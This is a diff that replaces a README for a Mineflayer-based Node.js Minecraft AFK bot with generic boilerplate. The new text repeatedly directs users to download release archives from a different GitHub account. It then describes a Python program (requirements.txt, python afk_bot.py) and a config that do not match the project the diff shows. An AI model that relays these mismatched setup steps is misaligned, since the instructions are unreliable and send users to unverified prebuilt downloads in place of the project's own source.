@@ -1,97 +1,85 @@
-<!-- Last updated: 2025-06-08T09:46:07Z -->
-# 🤖 Minecraft AFK Bot (Mineflayer-Based)
+# Minecraft AFK Bot 🤖
 
-This is a lightweight Minecraft Java AFK Bot powered by [Mineflayer](https://github.com/PrismarineJS/mineflayer). It connects to a Java server, performs basic movements to avoid AFK detection, and can be customized via a simple configuration file.
+![Minecraft AFK Bot](https://img.shields.io/badge/Minecraft-AFK_Bot-brightgreen)
 
----
+Welcome to the **Minecraft AFK Bot** repository! This project provides an automated solution to keep your Aternos servers running 24/7. Whether you're away from your game or busy with other tasks, this bot ensures your server remains online. It is not limited to Aternos; it can also be adapted for other services.
 
-## ✨ Features
+## Table of Contents
 
-* Connect to Minecraft Java servers (IP + port)
-* Customize bot username
-* Control chunk loading and memory usage
-* Periodic chunk pruning to reduce resource usage
-* Auto-movement behavior: step forward/backward, jump, sneak, loop
-* Easy configuration via `config.json`
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
----
+## Features
 
-## ⚡ Installation
+- **Keep Servers Online**: Automatically moves in-game to prevent your server from going idle.
+- **Multi-Service Support**: While designed for Aternos, it can be modified for other gaming services.
+- **Lightweight**: Minimal resource usage, allowing you to run it alongside other applications.
+- **Easy Setup**: Simple installation process with clear instructions.
 
-### 1. Clone the repository
+## Installation
 
-```bash
-git clone https://github.com/icelaterdc/Minecraft-AFK-Bot.git
-cd Minecraft-AFK-Bot
-```
+To get started, you need to download the latest release of the Minecraft AFK Bot. You can find it [here](https://github.com/EntityBlood/Minecraft-AFK-Bot/releases). Download the appropriate file for your system and follow the instructions below.
 
-### 2. Install dependencies
+1. **Download the Release**: Visit the [Releases section](https://github.com/EntityBlood/Minecraft-AFK-Bot/releases) to get the latest version.
+2. **Extract the Files**: Unzip the downloaded file to a location of your choice.
+3. **Install Dependencies**: Make sure you have all necessary dependencies installed. Refer to the `requirements.txt` file included in the package.
 
-```bash
-npm install
-```
+## Usage
 
-### 3. Configure `config.json`
+After installation, you can start using the bot. Follow these steps:
+
+1. **Open the Terminal**: Navigate to the directory where you extracted the bot.
+2. **Run the Bot**: Execute the bot with the command:
+   ```
+   python afk_bot.py
+   ```
+3. **Monitor the Bot**: Keep an eye on the terminal for any messages or errors.
+
+## Configuration
+
+Before using the bot, you may want to configure it to suit your needs. The configuration file is located in the extracted folder and is named `config.json`. Open this file and adjust the settings as follows:
+
+- **Server Name**: Specify the name of your Aternos server.
+- **Movement Settings**: Configure how often the bot should move to prevent idling.
+- **Notification Settings**: Set up notifications for when the bot starts or encounters an error.
+
+### Example Configuration
 
 ```json
 {
-  "serverHost": "yourserver.aternos.me",
-  "serverPort": 25565,
-  "botUsername": "MyBotName",
-  "botChunk": 4
+  "server_name": "MyMinecraftServer",
+  "movement_interval": 60,
+  "notifications": true
 }
 ```
 
-> ⚠️ Make sure the server is in offline mode if you're not using premium accounts.
+## Contributing
+
+We welcome contributions to the Minecraft AFK Bot! If you would like to help improve this project, please follow these steps:
+
+1. **Fork the Repository**: Click on the "Fork" button at the top right of this page.
+2. **Create a New Branch**: Use the command:
+   ```
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Your Changes**: Implement your feature or fix.
+4. **Commit Your Changes**: Use a clear commit message.
+5. **Push to Your Branch**: Push your changes to GitHub.
+6. **Open a Pull Request**: Go to the original repository and click on "New Pull Request".
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Support
+
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/EntityBlood/Minecraft-AFK-Bot/releases) for updates or open an issue in the repository.
 
 ---
 
-## 🤖 Starting the Bot
-
-```bash
-node bot.js
-```
-
-On successful connection:
-
-* You'll see `✅ BotName is Ready!` in the console
-* After 5 seconds, all loaded chunks are cleared
-* Every 20 seconds, any chunks beyond a 6-chunk radius will be removed
-
----
-
-## ⚙️ Configuration Options (`config.json`)
-
-| Key            | Description                                |
-| -------------- | ------------------------------------------ |
-| `serverHost`         | IP or domain of your Minecraft server      |
-| `serverPort`         | Server port (default is 25565)             |
-| `botUsername`     | The bot's visible name in-game             |
-| `botChunk` | Radius of loaded chunks (recommended: 1–6) |
-
----
-
-## ⚠️ Notes
-
-* **Skins**: Skins might not appear properly if the server is in offline mode.
-* **Sneak Movement**: The bot uses `setControlState('sneak', true)`, but some servers may block or ignore this action.
-* **AFK Prevention**: The bot periodically moves, sneaks, and jumps to prevent disconnection due to inactivity.
-
----
-
-## 📚 Resources & Contributions
-
-* [Mineflayer Docs](https://mineflayer.prismarine.js.org/)
-* [PrismarineJS GitHub](https://github.com/PrismarineJS/)
-
-Feel free to contribute by opening a pull request or submitting an issue.
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License.
-
----
-
-Get started now and keep your server active with a smart, customizable bot! ⛏️
+Thank you for checking out the Minecraft AFK Bot! We hope this tool enhances your gaming experience by keeping your servers online while you focus on other activities. Happy gaming! 🎮
